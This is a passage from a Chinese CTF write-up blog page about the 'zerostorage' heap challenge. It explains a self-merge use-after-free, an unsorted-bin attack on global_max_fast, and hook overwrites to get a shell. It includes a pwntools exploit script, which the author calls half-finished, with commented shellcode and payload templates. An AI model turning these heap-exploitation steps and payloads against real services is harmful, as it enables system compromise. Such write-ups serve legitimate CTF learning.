创建一个新的newchunk来记录合并后的信息，堆块地址取to的堆块地址，将from地址给free掉</span></span><br><span class="line">  *(newchunk + <span class="number">2</span>) = unk_203048 ^ chunk222;</span><br><span class="line">  chunk1_1 = (*(ck1 + <span class="number">2</span>) ^ v21);</span><br><span class="line">  *newchunk = <span class="number">1</span>;</span><br><span class="line">  *(newchunk + <span class="number">1</span>) = ZZsize;</span><br><span class="line">  *ck1 = <span class="number">0</span>;</span><br><span class="line">  *(ck1 + <span class="number">1</span>) = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">free</span>(chunk1_1);                               <span class="comment">// 先置为0，再free，ptr相同，有UAF漏洞</span></span><br><span class="line">  *(ck1 + <span class="number">2</span>) = <span class="number">0L</span>L;</span><br><span class="line">  chk2 = &amp;unk_203060 + <span class="number">24</span> * dx2;</span><br><span class="line">  *chk2 = <span class="number">0</span>;</span><br><span class="line">  *(chk2 + <span class="number">1</span>) = <span class="number">0L</span>L;</span><br><span class="line">  *(chk2 + <span class="number">2</span>) = <span class="number">0L</span>L;                          <span class="comment">//这里没有free掉to的堆块，只是清空数据</span></span><br><span class="line">  --num;</span><br><span class="line">  <span class="keyword">return</span> __printf_chk(<span class="number">1L</span>L, <span class="string">"Entry %d is successfully merged to entry %d. New entry ID is %d.\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码审计能力真的很重要，一个很重要的知识点和技巧就是熟练掌握重命名的方法(n)，这样会让题目清晰很多，还有写结构体，理清楚逻辑，堆题一般都可以看懂，虽然不一定会做hhhhh</p>
+<p>这里有个和明显的点，没有指明merge的两个堆块不能是同一个堆块，漏洞点就在这里，当两个堆块是同一个堆块时，大小必定相同，然后就会合并成一个新的堆块（相当于自我copy）</p>
+<p>由于保留了to堆块的地址，free掉了from的地址，但是from和to是用同一个地址，漏洞出现！</p>
+<p>我们可以读写free完了的数据，造成UAF漏洞，这里通过构造堆块布局，可以泄露出堆地址和真实地址</p>
+<p>接着看free函数：</p>
+<p><img src="/blog_img/1567683646929.png" alt="56768364692">)常见的free功能，但是有UAF，但是用不了，因为重新calloc时，会自动清空原有的值(main_arena的地址)</p>
+<p>再接着是打印函数：</p>
+<p><img src="/blog_img/1567683725351.png" alt="56768372535"></p>
+<p>根据下标索引来确定地址，从而打印出里面的内容，可打印真实地址和heap地址</p>
+<p><img src="/blog_img/1567683801278.png" alt="56768380127"></p>
+<p>用来看下idx</p>
+<p>最后是有个exit函数</p>
+<p>好了，以上分析完了，知道漏洞点在merge函数那里，也是重点分析的地方，下面讲解下思路</p>
+<p>1、先堆块布局，然后利用merge相同块的UAF泄露出堆地址和真实地址</p>
+<p>2、根据真实地址得到system、free_hook地址(开了got表可改)、程序基地址</p>
+<p>3、因为程序只能申请unsorted_bin的大小，但是我们可以改free块的内容，也就是说可以改bk指针，就可以改变global_max_fast为main地址，实现unsorted_bin的attack</p>
+<p>4、这样后面申请的堆块都是fastbin的堆块，也就是说可以伪造堆块任意地址写了。</p>
+<p>5、改变free状态的fastbin的FD指针为我们的fake_chunk，通过不断申请得到fake_chunk，实现的正是任意地址写的操作。</p>
+<p>6、要么是fake_chunk改malloc_hook为onegadget，要么house of spirit到bss段，然后改写那个堆地址为free_hook地址，接着再dpdate时就可以改free_hook为system,再free掉一个/bin/sh\x00的堆块既可getshell</p>
+<h4 id="这里顺便也记录下realloc使用的技巧："><a href="#这里顺便也记录下realloc使用的技巧：" class="headerlink" title="*这里顺便也记录下realloc使用的技巧："></a>*这里顺便也记录下realloc使用的技巧：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="number">0</span>,<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">remalloc(<span class="number">0</span>,<span class="number">0x0</span>) //相当于free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这样就有double free的产生了，接着就任意地址写了。</p>
+<p>这道题其实没有复现成功，因为我的环境是ubuntu16.04的，但是这题是14的，所以利用offset2libc我的不行。</p>
+<h4 id="讲解下offset2libc-内核部分-："><a href="#讲解下offset2libc-内核部分-：" class="headerlink" title="讲解下offset2libc(内核部分)："></a>讲解下offset2libc(内核部分)：</h4><p>这是一种可以绕过内存地址随机化的攻击方式，泄露出libc的真实地址后，offset2libc是程序基地址（0x7f开头的映射地址，映射的是0x55开头的地址）和libc的基地址之间的偏移，这个根据ubuntu版本和编译连接的顺序决定，我知道14版本的是0x5e4000，所以可以直接用。。。。</p>
+<p>最后黏贴下我的半成品exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libformatstr <span class="keyword">import</span> FormatStr</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./zerostorage'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./zerostorage'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line"><span class="comment">#onegadget32(libc.so.6)  0x3ac5c  0x3ac5e  0x3ac62  0x3ac69  0x5fbc5  0x5fbc6</span></span><br><span class="line"><span class="comment"># payload32 = fmtstr_payload(offset ，&#123;xxx_got:system_addr&#125;)</span></span><br><span class="line"><span class="comment"># f = FormatStr(isx64=1)</span></span><br><span class="line"><span class="comment"># f[0x8048260]=0x45372800</span></span><br><span class="line"><span class="comment"># f[0x8048260+4]=0x7f20</span></span><br><span class="line"><span class="comment"># f.payload(7)</span></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line"><span class="comment">#shellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' </span></span><br><span class="line"><span class="comment">#shellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'</span></span><br><span class="line"><span class="comment">#shellcode64 = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'</span></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice: "</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"Length of new entry: "</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">"Enter your data: "</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice: "</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">"Entry ID: "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">"Length of entry: "</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">"Enter your data: "</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice: "</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">"Merge from Entry ID: "</span>)</span><br><span class="line">    sl(str(idx1))</span><br><span class="line">    ru(<span class="string">"Merge to Entry ID: "</span>)</span><br><span class="line">    sl(str(idx2))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice: "</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">"Entry ID: "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice: "</span>)</span><br><span class="line">    sl(<span class="string">'5'</span>)</span><br><span class="line">    ru(<span class="string">"Entry ID: "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice: "</span>)</span><br><span class="line">    sl(<span class="string">'6'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice: "</span>)</span><br><span class="line">    sl(<span class="string">'7'</span>)</span><br><span class="line">unk = <span class="number">0xfaac901f2519a1e1</span></span><br><span class="line">debug(<span class="number">0x000000000000139D</span>)</span><br><span class="line">malloc(<span class="number">0x8</span>,<span class="string">'aaaaaaaa'</span>)<span class="comment">#0</span></span><br><span class="line">malloc(<span class="number">0x8</span>,<span class="string">'bbbbbbbb'</span>)<span class="comment">#1</span></span><br><span class="line">malloc(<span class="number">0x8</span>,<span class="string">'cccccccc'</span>)<span class="comment">#2</span></span><br><span class="line">malloc(<span class="number">0x8</span>,<span class="string">'eeeeeeee'</span>)<span class="comment">#3</span></span><br><span class="line">malloc(<span class="number">0x8</span>,<span class="string">'ffffffff'</span>)<span class="comment">#4</span></span><br><span class="line">malloc(<span class="number">0x68</span>,<span class="string">'g'</span>*<span class="number">0x68</span>)<span class="comment">#5</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">merge(<span class="number">2</span>,<span class="number">2</span>)<span class="comment">#0</span></span><br><span class="line">view(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">"Entry No.0:\n"</span>)</span><br><span class="line">heap = u64(rc(<span class="number">8</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap---&gt;"</span> + hex(heap)</span><br><span class="line">malloc_hook = u64(ru(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">88</span> - <span class="number">0x10</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"malloc_hook---&gt;"</span> + hex(malloc_hook)</span><br><span class="line">libc_base = malloc_hook - libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">onegadget = libc_base + <span class="number">0xf1147</span></span><br><span class="line"><span class="comment"># pie_addr = libc_base  + 0x5e4000</span></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">global_max_fast_addr = libc_base + <span class="number">0x3c67f8</span></span><br><span class="line">bss_addr = pie_addr + <span class="number">0x203060</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x8</span>,<span class="string">'zzzzzzzz'</span>)<span class="comment">#6</span></span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += p64(<span class="number">0</span>) + p64(global_max_fast_addr<span class="number">-0x10</span>) </span><br><span class="line">update(<span class="number">0</span>,<span class="number">0x10</span>,py)</span><br><span class="line">malloc(<span class="number">0x8</span>,<span class="string">'mmmmmmmm'</span>)<span class="comment">#7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># merge(3,3)#7</span></span><br><span class="line"><span class="comment"># update(7,0x8,p64(malloc_hook-0x23))</span></span><br><span class="line"><span class="comment"># malloc(0x8,'ffffffff')#8</span></span><br><span class="line"><span class="comment"># py = 'a'*0x13 + p64(onegadget)</span></span><br><span class="line"><span class="comment"># malloc(0x68,py)#9</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里计算那个全局变量global_max_fast时，利用的是固定偏移法，直接libc.symbols[“”]是找不到的。</p>
+<h4 id="gdb动态调试：telescope-amp-函数或者变量的名字-可以看真实地址以及里面的内容"><a href="#gdb动态调试：telescope-amp-函数或者变量的名字-可以看真实地址以及里面的内容" class="headerlink" title="gdb动态调试：telescope  &amp;(函数或者变量的名字)可以看真实地址以及里面的内容"></a>gdb动态调试：telescope  &amp;(函数或者变量的名字)可以看真实地址以及里面的内容</h4><p>telescope  &amp;global_max_fast</p>
+<p>就会回显出全局变量的真实地址</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/statics/chengdu.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d=''
+    >Comments</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
+                    <p>V1ct0r</p>
+                    <span>Where there is a will,there is a way！</span>
+                    <dl>
+                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">62 <p>Articles</p></a></li>
+                    <li><a href="/categories">7 <p>Categories</p></a></li>
+                    <li><a href="/tags">59 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>Contents</h4>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一、题目"><span class="toc-number">1.</span> <span class="toc-text">一、题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#zerostorage"><span class="toc-number">1.1.</span> <span class="toc-text">zerostorage</span></a></li></ol></li></ol>
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2020
+        <span class="gradient-text">
+            V1ct0r
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+
+    
+<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+
+
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
+
+    
+<script src="/js/busuanzi.min.js"></script>
+
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-149874671-1');
+    </script>
+
+
+
+
+
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["Where there is a will,there is a way！", "有志者，事竟成！"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
+
+
+
+
+</html>
